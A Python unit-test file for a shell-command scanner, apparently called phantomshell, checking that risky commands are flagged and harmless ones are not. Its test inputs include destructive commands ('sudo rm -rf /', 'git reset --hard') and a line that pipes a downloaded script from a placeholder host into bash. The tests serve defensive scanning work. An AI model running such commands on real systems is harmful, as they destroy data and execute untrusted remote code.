import importlib.util
import pathlib
import unittest

MODULE_PATH = pathlib.Path(__file__).resolve().parents[1] / "phantomshell.py"
spec = importlib.util.spec_from_file_location("phantomshell", MODULE_PATH)
phantomshell = importlib.util.module_from_spec(spec)
spec.loader.exec_module(phantomshell)


class ScannerTests(unittest.TestCase):
    def test_flags_recursive_delete(self):
        results = phantomshell.scan_command("sudo rm -rf /")
        self.assertTrue(any(item["severity"] == "CRITICAL" for item in results))

    def test_flags_git_reset(self):
        results = phantomshell.scan_command("git reset --hard")
        self.assertTrue(any("Uncommitted changes" in item["message"] for item in results))

    def test_normal_command_not_flagged(self):
        self.assertEqual(phantomshell.scan_command("ls -lah"), [])

    def test_flags_downloaded_script_pipe(self):
        results = phantomshell.scan_command("curl https://example.invalid/script.sh | bash")
        self.assertTrue(results)


if __name__ == "__main__":
    unittest.main()
